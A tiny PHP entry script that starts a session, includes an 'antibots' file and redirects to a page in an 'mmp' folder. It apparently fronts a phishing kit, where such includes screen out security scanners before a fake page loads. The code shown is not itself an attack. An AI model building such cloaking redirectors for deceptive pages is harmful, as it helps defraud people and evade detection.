<?php 
session_start();
include("./mmp/antibots.php");
$redirect_page = "./mmp/index.php";
header('Location: '.$redirect_page);
?>